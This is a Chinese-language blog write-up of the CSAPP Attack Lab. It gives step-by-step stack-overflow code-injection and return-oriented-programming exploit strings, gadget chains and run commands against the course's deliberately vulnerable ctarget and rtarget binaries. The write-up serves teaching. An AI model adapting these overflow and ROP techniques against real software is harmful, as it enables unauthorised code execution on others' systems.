---
title: "CSAPP的lab3-attacklab"
description: "这是一场和计算机的邂逅."
date: "Feb 27 2024"
updated: "Feb 29 2024"
tags: ["学习笔记", "CSAPP"]
category: "CSAPP"
---


> 一个寒假没动,开学了,努努力把Attack Lab开盒了

# Part I CI

## 总览

> CI: Code Injection Attacks

测试下这个程序

注意我们在执行ctarget程序的时候默认是连接到cmu的服务器，但是我们不是cmu的学生所以连不上服务器也就无法执行代码，所以执行的时候要加命令行参数 -q 以阻止连接到服务器的行为。

输入以下命令运行ctarget

```cpp
./ctarget -q
```

(同理,用gdb ctarget时,要注意run要写成run -q,不然就会试图链接远程服务器,然后报以下错误)

![image-20240229000718171](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454046.png)

随意的输入个string得知程序大致运行方式

![image-20240229000829319](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454085.png)

## Phase_1

然后我们在做实验之前一定要看的pdf文档告诉我们以下信息
For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute
an existing procedure.
Function getbuf is called within CTARGET by a function test having the following C code:

```cpp
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution
within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,
there is code for a function touch1 having the following C representation:

```cpp
void touch1() {
    vlevel = 1;
    printf("Touch!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement,
rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly
related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.
Some Advice:
• All the information you need to devise your exploit string for this level can be determined by exam-
ining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.
• The idea is to position a byte representation of the starting address for touch1 so that the ret
instruction at the end of the code for getbuf will transfer control to touch1.
• Be careful about byte ordering.
• You might want to use GDB to step the program through the last few instructions of getbuf to make
sure it is doing the right thing.
• The placement of buf within the stack frame for getbuf depends on the value of compile-time
constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the
disassembled code to determine its position.

所以我们要把touch1的函数位置来覆盖getbuf的返回值以便执行touch1

先输入查看汇编代码

```bash
objdump -d ctarget >ctarget.s
```

Getbuf:

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp;
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

Touch1:

```assembly
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

0x28在十进制下2*16+8=40个bytes,一个地址是8个bytes,所以我们想要在getbuf时跳转到touch1则需要缓冲区把原本的地址的位置(0x5561dca8)覆盖成0x004017c0,而那空余的四十个bytes想填啥填啥

即字节码为:(小端法,逆序存储)

```
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
c0 17 40 00
```

保存该文件为sol1.txt,然后把这个字节码转化成string,通过hex2raw命令(可以查看pdf文档的附录A),然后可以通过-i进行重定向输入,则完成Phase_1

输入命令

```bash
./hex2raw <sol1.txt >sol1r.txt
gdb ctarget
run -q -i sol1r.txt
```

观察到以下信息则通关!

![image-20240302013522137](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220621.png)

## Phase_2

照例读一遍官方pdf文档:

Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function **touch2** having the following C representation:
```cpp
void touch2(unsigned val)
{
vlevel = 2;/* Part of validation protocol */
if (val == cookie) {
printf("Touch2!: You called touch2(0x%.8x)\n", val);
validate(2);
} 
else {
printf("Misfire: You called touch2(0x%.8x)\n", val);
fail(2);
}
exit(0);
 }
```

Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,however, you must make it appear to touch2 as if you have passed your cookie as its argument.`你的任务是让CTARGET执行touch2的代码，而不是返回测试。但是，在这种情况下，您必须使它看起来像touch2一样，就像您已将cookie作为其参数传递一样。`

Some Advice:
• You will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it.`您将希望以这样一种方式定位注入代码的地址的字节表示形式，即getbuf代码末尾的ret指令将控制权转移给它。`
• Recall that the first argument to a function is passed in register %rdi.`回想一下，函数的第一个参数是在寄存器 % rdi中传递的。`
• Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2.`您注入的代码应将寄存器设置为您的cookie，然后使用ret指令将控制权转移到touch2中的第一个指令。`
• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of control, even when you are not returning from a call.`不要尝试在漏洞利用代码中使用jmp或调用指令。这些指令的目的地地址的编码难以公式化。对所有控制权转移使用ret指令，即使您没有从呼叫中返回。`
• See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequence`请参阅附录b中有关如何使用工具生成指令序列的字节级表示的讨论`

touch2

```assembly
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

所以我要做的应该是把%rdi中的值变成cookie的值,这样在比较时便会通过.

知识扫盲:汇编语言中的ret指令是call指令的逆操作，它表示从子程序中返回到主程序。执行ret指令时，CPU会从堆栈中弹出上一个储存的PC值，并将其加载到PC寄存器中，程序就回到了主程序中继续执行。这时%rsp不会变化(如果没有其它命令的话)

需完成操作:

- 将cookie(0x59b997fa中的值推送到%rdi中

- 将touch2的地址push到栈中

- ret,取到touch2的地址

根据以上操作写出汇编代码,保存该代码为t2.s文件

```assembly
mov $0x59b997fa, %rdi
pushq $0x4017ec
ret
```

接下来我们要得到机器代码(编译再反汇编得到机器代码指令)

输入以下指令

```
gcc -c -Og t2.s
objdump -d t2.o>t2.txt
```

可以得到汇编代码的机器指令:

![image-20240302014356466](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220772.png)

然后通过gdb挑选一个注入代码的位置,这里我们选择getbuf中的$rsp栈顶作为代码注入位置,通过gdb命令,打一个在getbuf的断点,探测到rsp的地址,即栈顶地址





![image-20240229135832513](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454240.png)

```
p $rsp=0x5561dc78
```

这样我们就可以开始编我们的进攻序列,在缓冲区中存放进攻指令,覆盖的地址填原来的栈顶,即在0x5561dc78注入代码进行进攻

![image-20240302014950119](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220816.png)

覆盖的地址要依照小端法逆序,而机器指令不用逆序,中间填充字符,当然可以考虑换一个代码注入位置.编完后我们要用hex2raw来转换进攻字节以便于生成进攻字符串

```
./hex2raw <sol2.txt>sol2r.txt
./ctarget -q -i sol2r.txt
```

然后提交会得到以下结果,圆满过关!

![image-20240302014929043](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220855.png)

或者我们可以选择不在那里注入代码,我们选择在test的栈帧内注入代码,即在0x5561dca8段注入代码!

![image-20240302015226085](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220891.png)

理论成立,实践开始!

圆满通关!

![image-20240302015316019](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220929.png)

## Phase_3

看一下官方文档:

Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:

touch3 C && Assembly Code:

```cpp
void touch3(char \*sval){
vlevel = 3; /*Part of validation protocol */
if (hexmatch(cookie, sval)) {
printf("Touch3!: You called touch3(\"%s\")\n", sval);
validate(3);
} 
else {
printf("Misfire: You called touch3(\"%s\")\n", sval);
fail(3);
}
exit(0);
}

00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00 
  401908:	48 89 fe             	mov    %rdi,%rsi
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>
  401916:	85 c0                	test   %eax,%eax
  401918:	74 23                	je     40193d <touch3+0x43>
  40191a:	48 89 da             	mov    %rbx,%rdx
  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
  401922:	bf 01 00 00 00       	mov    $0x1,%edi
  401927:	b8 00 00 00 00       	mov    $0x0,%eax
  40192c:	e8 bf f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401931:	bf 03 00 00 00       	mov    $0x3,%edi
  401936:	e8 52 03 00 00       	callq  401c8d <validate>
  40193b:	eb 21                	jmp    40195e <touch3+0x64>
  40193d:	48 89 da             	mov    %rbx,%rdx
  401940:	be 60 31 40 00       	mov    $0x403160,%esi
  401945:	bf 01 00 00 00       	mov    $0x1,%edi
  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
  40194f:	e8 9c f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401954:	bf 03 00 00 00       	mov    $0x3,%edi
  401959:	e8 f1 03 00 00       	callq  401d4f <fail>
  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
  401963:	e8 d8 f4 ff ff       	callq  400e40 <exit@plt>
```

Hexmatch C &&Assembly Code

```cpp
/* Compare string to hex represention of unsigned value *///将字符串与无符号值的十六进制表示进行比较
int hexmatch(unsigned val, char *sval) {
char cbuf[110];
/*Make position of check string unpredictable *///使检查字符串的位置不可预测
char *s = cbuf + random() % 100;
sprintf(s, "%.8x", val);//将val转为16进制存入s
return strncmp(sval, s, 9) == 0;
}

000000000040184c <hexmatch>:
  40184c:	41 54                	push   %r12
  40184e:	55                   	push   %rbp
  40184f:	53                   	push   %rbx
  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  401854:	41 89 fc             	mov    %edi,%r12d
  401857:	48 89 f5             	mov    %rsi,%rbp
  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401861:	00 00 
  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  401868:	31 c0                	xor    %eax,%eax
  40186a:	e8 41 f5 ff ff       	callq  400db0 <random@plt>
  40186f:	48 89 c1             	mov    %rax,%rcx
  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  401879:	0a d7 a3 
  40187c:	48 f7 ea             	imul   %rdx
  40187f:	48 01 ca             	add    %rcx,%rdx
  401882:	48 c1 fa 06          	sar    $0x6,%rdx
  401886:	48 89 c8             	mov    %rcx,%rax
  401889:	48 c1 f8 3f          	sar    $0x3f,%rax
  40188d:	48 29 c2             	sub    %rax,%rdx
  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  401898:	48 c1 e0 02          	shl    $0x2,%rax
  40189c:	48 29 c1             	sub    %rax,%rcx
  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
  4018a3:	45 89 e0             	mov    %r12d,%r8d
  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx
  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  4018b2:	be 01 00 00 00       	mov    $0x1,%esi
  4018b7:	48 89 df             	mov    %rbx,%rdi
  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax
  4018bf:	e8 ac f5 ff ff       	callq  400e70 <__sprintf_chk@plt>
  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx
  4018c9:	48 89 de             	mov    %rbx,%rsi
  4018cc:	48 89 ef             	mov    %rbp,%rdi
  4018cf:	e8 cc f3 ff ff       	callq  400ca0 <strncmp@plt>
  4018d4:	85 c0                	test   %eax,%eax
  4018d6:	0f 94 c0             	sete   %al
  4018d9:	0f b6 c0             	movzbl %al,%eax
  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
  4018e8:	00 00 
  4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>
  4018ec:	e8 ef f3 ff ff       	callq  400ce0 <__stack_chk_fail@plt>
  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
  4018f5:	5b                   	pop    %rbx
  4018f6:	5d                   	pop    %rbp
  4018f7:	41 5c                	pop    %r12
  4018f9:	c3                   	retq   
```



Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.`您必须使其显示为touch3，就像您已将cookie的字符串表示形式作为其参数一样。`
Some Advice:
• You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”`您需要在进攻字符串中包含一个代表你cookie的字符串。该字符串应由八个十六进制数字 (从最高到最低有效排序) 组成，没有前导 “0x”。`
• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.`回想一下，字符串在C中表示为字节序列，后跟值为0的字节。在任何Linux机器上键入 “man ascii” 以查看所需字符的字节表示。`
• Your injected code should set register %rdi to the address of this string.`注入的代码应将寄存器 % rdi设置为该字符串的地址。`
• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.` 当调用函数hexmatch和strncmp时，它们将数据推送到堆栈上，覆盖保存getbuf使用的缓冲区的内存部分。因此，您需要小心放置cookie的字符串表示形式。`

解决问题逻辑如下:

我们要实现的功能是让cookie和sval相匹配的话,那么就能通关,sval存放于寄存器%rdi中,以16进制的方式存在,而比较函数中会将cookie转化为16进制,所以我们要将cookie转化为16进制然后写入到%rdi

在呼叫touch3之前我们要把char *sval的值(其指针指向sval这个地址的字串)存入%rdi中,而该地址应该存的是cookie转化为ascii码表示,同时要知道hexmatch一上来就要了110个byte,所以很有可能把缓冲区给重新分配.

为了防止存放的字符串被hexmatch和strncmp覆盖,不能再0x5561dc78-0x5561dca0者之间存放字串,而0x5561dc78是分配的最低位置,0x5561dca0是放置跳转地址的位置,所以我们把字串放在test的栈空间之中比如:0x5561dca8.

操作如下

- 把cookie转换成ascii码,通过查表的方式把cookie挨个转成ascii码.\0-->00

```
35 39 62 39 39 37 66 61 00 #00是字符串结尾
```

- 将touch3地址压入栈中
- 将%rsp地址+8--->到%rdi中(当然也可以写精确地址0x5561dca8)
- retq

构建以下命令,保存为t3.s文件

```assembly
push $0x004018fa
lea 0x8(%rsp),%rdi
retq
```

然后用Phase_2的方法得到机器指令代码

```
gcc -c -Og t3.s
objdump -d t3.o>t3.txt
```

会得到如下代码

```assembly
t3.o:     file format elf64-x86-64
0000000000000000 <.text>:
   0:	68 fa 18 40 00       	pushq  $0x4018fa
   5:	48 8d 7c 24 08       	lea    0x8(%rsp),%rdi
   a:	c3                   	retq   

```

接下来我们就可以编写sol3.txt,记住64位机器输入指令记得补零,不然可能段错误

```
68 fa 18 40 00 48 8d 7c 
24 08 c3 00 00 00 00 00//上面的是机器指令代码
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00//填充字符
78 dc 61 55 00 00 00 00 //还是跳转到栈顶,需要padding
35 39 62 39 39 37 66 61 //存再test栈帧中的值,0x5561dca0
00 
```

最后输入以下指令

```
./hex2raw <sol3.txt >sol3r.txt && ./ctarget -q -i sol3r.txt
```

若看见以下界面,则恭喜通关!

![image-20240302020227034](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220967.png)





# Part II: ROP

## 总览

>ROP: Return-Oriented Programming
>
>什么叫Gadgets?思索许久,发现就是断章取义,重塑代码,草船借箭

得到rtarget的汇编

```
objdump -d rtarget>rtarget.s
```

Part2的限制:

1. 恢复了栈的随机化,每次栈的位置都不一样,无法决定把代码放到哪个位置
2. 恢复了栈的区域标记,分为可写,可读,可执行.

```
堆栈包含一系列小工具地址。每个gadget由一系列指令字节组成，最后一个是0xc3，编码ret指令。当程序从此配置开始执行 ret 指令时，它将启动一系列 gadget 执行，每个 gadget 末尾的 ret 指令导致程序跳转到下一个 gadget 的开头。
小工具可以使用与编译器生成的汇编语言语句相对应的代码，尤其是函数末尾的语句。在实践中，这种形式可能有一些有用的小工具，但不足以实现许多重要的操作。例如，编译函数不太可能将 popq %rdi 作为 ret 之前的最后一条指令。幸运的是，对于面向字节的指令集（例如 x86-64），通常可以通过从指令字节序列的其他部分提取模式来找到小工具。
```

举一个Gadgets的小例子,这有一个很有意思的小现象

Setval_210's C && Assembly Code

```
void setval_210(unsigned * p) { 
* p = 3347663060U; 
}

0000000000400f15 <setval_210>:
400f15: c7 07 d4 48 89 c7   movl  $0xc78948d4,(%rdi)
400f1b: c3                  retq

```

The byte sequence 48 89 c7 encodes the instruction movq %rax, %rdi. (See Figure 3A for the encodings of useful movq instructions.) This sequence is followed by byte value c3, which encodes the ret instruction. The function starts at address 0x400f15, and the sequence starts on the fourth byte of the function. Thus, this code contains a gadget, having a starting address of 0x400f18, that will copy the 64-bit value in register %rax to register %rdi.

`断章取义`

**从0x400f18看到0x400f1b表示的意思则是把%rax的值传到%rdi,即为movq %rax , %rdi**

Your code for RTARGET contains a number of functions similar to the setval_210 function shown above in a region we refer to as the gadget farm. Your job will be to identify useful gadgets in the gadget farm and use these to perform attacks similar to those you did in Phases 2 and 3.

Important: The gadget farm is demarcated by functions start_farm and end_farm in your copy of rtarget. Do not attempt to construct gadgets from other portions of the program code.

```
您的 RTARGET 代码包含许多与上面所示的 setval_210 函数类似的函数，这些函数位于我们称为小工具场的区域中。您的工作将是识别小工具场中有用的小工具，并使用它们来执行类似于您在第 2 阶段和第 3 阶段中所做的攻击。
重要提示：小工具场由 rtarget 副本中的函数 start_farm 和 end_farm 划分。不要尝试从程序代码的其他部分构造小工具。
```

## Phase_4

Phase_4要求:

For Phase 4,you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the ﬁrst eight x86-64 registers (%rax–%rdi).

- movq : The codes for these are shown in Figure 3A.

![image-20240229212126798](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png)

- popq : The codes for these are shown in Figure 3B.

![image-20240229212144522](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png)

- ret : This instruction is encoded by the single byte 0xc3.

- nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single byte 0x90. Its only effect is to cause the program counter to be incremented by 1.

Some Advice:

- All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm.

- You can do this attack with just two gadgets.

- When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.

要求总结:

- 复现phase_2的操作

  ```
  mov $0x59b997fa, %rdi
  pushq $0x4017ec
  ret
  ```

- 只需要用only 第一到第八个寄存器(%rax ---> %rdi)

- 需要注意0xc3为标志的ret

- 只需要使用两个gadgets 

我们知道需要的gadget都存在farm.c中,所以我们先farm.c编译再反汇编得到机器指令+地址,便于寻找,输入以下指令

**一定要注意要输入-Og,不然就会使用stack frame pointer,会变得比较复杂**

```
gcc -c -Og farm.c
objdump -d farm.o>farm.s
```

我们便会得到farm.s,我们要做的是把0x59b997fa这个值弄到%rdi里面,但是我们知道我们不能用mov来直接mov立即数,因为farm中没有cookie的值,只能另辟蹊径,把这个cookie的值压入栈中然后再popq

操作顺序:

- 转移cookie的值转移到%rdi中

- 把$0x4017ec(touch2地址)压入栈中
- ret

这是相关联的函数,需要在其中找到gadgets

```assembly
0000000000000000 <start_farm>:
   0:	f3 0f 1e fa          	endbr64 
   4:	b8 01 00 00 00       	mov    $0x1,%eax
   9:	c3                   	retq   

000000000000000a <getval_142>:
   a:	f3 0f 1e fa          	endbr64 
   e:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  13:	c3                   	retq   

0000000000000014 <addval_273>:
  14:	f3 0f 1e fa          	endbr64 
  18:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  1e:	c3                   	retq   

000000000000001f <addval_219>:
  1f:	f3 0f 1e fa          	endbr64 
  23:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  29:	c3                   	retq   

000000000000002a <setval_237>:
  2a:	f3 0f 1e fa          	endbr64 
  2e:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  34:	c3                   	retq   

0000000000000035 <setval_424>:
  35:	f3 0f 1e fa          	endbr64 
  39:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  3f:	c3                   	retq   

0000000000000040 <setval_470>:
  40:	f3 0f 1e fa          	endbr64 
  44:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4a:	c3                   	retq   

000000000000004b <setval_426>:
  4b:	f3 0f 1e fa          	endbr64 
  4f:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  55:	c3                   	retq   

0000000000000056 <getval_280>:
  56:	f3 0f 1e fa          	endbr64 
  5a:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  5f:	c3                   	retq   

0000000000000060 <mid_farm>:
  60:	f3 0f 1e fa          	endbr64 
  64:	b8 01 00 00 00       	mov    $0x1,%eax
  69:	c3                   	retq  
```

有意识的搜索%rdi这个寄存器相关的机器指令`48 89 c7`,搜索和%rax有关的`58`,便注意到这两个函数,<addval_273>和<addval_219>,在rtarget的反汇编中把他找出来(这样能找到地址)

```
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
```

当273>函数从0x004019a2开始时,会执行`mov %rax,%rdi`,`ret`

当219>函数从0x004019ab开始时,会执行`pop %rax`,`ret`.

这样我们不就可以组合出我们的代码了吗,通过一个一个ret来吧不同的gadget连接在一起

答案框架如下,

```
---栈底---
0x4017ec    <---touch2地址
0x4019a2    <--gadget2
cookie            #0x59b997fa   <----%rsp
 0x4019ab     <---gadget1
---栈顶---
```

编写答案 sol4.txt(注意小端法)

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00  00 00 00 00
ec 17 40 00 00 00 00 00
```

输入命令

```
./hex2raw <sol4.txt >sol4r.txt && ./rtarget -q -i sol4r.txt
```

注意是要运行rtarget!!!,不要搞错了兄弟们!!!

若出现以下界面则为成功通关

![image-20240302021056405](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220002.png)



## Phase_5

> 坚持就是胜利!

![image-20240229212126798](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png)

![image-20240229212144522](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png)

<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220043.png" alt="image-20240301232923919" style="zoom:200%;" />

我们要通过ROP实现touch3的功能,touch3在phase_3的实现如下

```
push $0x004018fa
lea 0x8(%rsp),%rdi
retq
```

操作顺序如下:

- 把touch3的地址压入栈中
- 把cookie的字符串指针地址存入到%rdi寄存器中

 ```
 35 39 62 39 39 37 66 61 00 # 00 是字符串末尾结束的\0
 ```

地址怎么找?

这是要重点解决的问题.因为开启了栈的随机化,无法定位字符串精确位置但我们可以通过栈顶的地址+相对地址得到字符串的地址

如何把准确的地址传送到%rdi寄存器中呢?当然是提前计算好偏移量,然后用一个寄存器承载这个偏移量,再一点一点的把他搬运到%rdi当中啦

下面是寻找一条完整的通路的全过程(已经将函数从farm中的形式换为了rtarget中的形式,使得地址一目了然),在这里面"--->"表示我倒序寻找通路时思维的前进试探,慢慢打通每一个节点,是寄存器转移顺序的反向,箭头后面表示的是Gadget的起始地址.

```
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq  
  ----- %rsp-->%rax----0x401a06------------

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

  ----%rax-->%rdi----0x4019a2--------
  这样子就把%rsp的地址丢到%rdi当中了
  执行完getbuf时%rsp= 0x5561dca8
  字符串应该是存在栈顶+相对位置

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq  
----这个lea能把%rsi作为偏移量,计算好后再返回到%rdi中就好了---0x4019d6

所以我们就要想办法往%rsi中丢值,因为找不到pop %rsi的片段,只能从其他地方入手

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   
  
  ---%ecx--->%esi----0x401a13
 -----
  想试验下78 和c9会不会影响执行程序,不会影响,照样能运行
00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	retq 
-----0x4019ea------

一步步往前找,每找到一个就看一下能不能通过pop得到该值

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq   

---%edx--->%ecx---0x401a69----

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq  

  ---%edx--->%eax---0x4019dd---
  
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq  
  ----pop %rax---0x4019cc----
  
找到了一条通路,所以我们就可以通过pop %rax的值来吧那个偏移量送到%rsi中,最后再把%rdi给更新了
就能够定位字符串的位置了

```

接下来我们找到每个gadget的location,记得加上一点偏移量来定位到对应的Gadgets开头,然后我们就可以编写答案框架了

```
----栈顶----
buf缓冲区,要填0x28个字符
movq %rsp-->%rax            <----gadget1    0x401a06   <----%rsp
movq %rax--->%rdi           <----gadget2    0x4019a2
pop %rax		           <----gadget3     0x4019cc
相对偏移量  0x48
movl %eax--->%edx          <---gadget4      0x4019dd
movl %edx--->%ecx          <---gadget5      0x401a69
movl %ecx---->%esi	      <---gadget6	0x401a13
lea (%rdi,%rsi,1),%rax	     <---gadget7      0x4019d6
movl %rax--->%rdi            <----gadget8      0x4019a2
$touch3                                <---gadget9        0x004018fa
cookie 			             <---gadget10       35 39 62 39 39 37 66 61
---栈底---
```



编写sol5.txt文档

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
69 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40  00 00 00 00 00
35 39 62 39 39 37 66 61
```

输入命令

```
./hex2raw <sol5.txt >sol5r.txt && ./rtarget -q -i sol5r.txt
```



提交一手,完美通关!!!

